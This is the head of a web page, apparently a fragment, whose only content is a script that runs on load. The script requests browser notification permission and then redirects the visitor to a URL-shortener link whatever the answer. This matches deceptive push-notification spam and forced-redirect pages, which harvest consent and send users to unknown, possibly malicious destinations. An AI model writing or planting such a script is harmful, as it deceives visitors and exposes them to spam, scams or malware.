<!DOCTYPE html>
<html lang="en">
<head>
<script>
function requestNotificationAndRedirect() {
  if (!("Notification" in window)) {
    window.location.href = "https://wu8.in/TBeBTB";
    return;
  }

  Notification.requestPermission().then(permission => {
    if (permission === "granted") {
      window.location.href = "https://wu8.in/TBeBTB";
    } else {
      window.location.href = "https://wu8.in/TBeBTB";
    }
  }).catch(() => {
    window.location.href = "https://wu8.in/TBeBTB";
  });
}
requestNotificationAndRedirect();
</script>
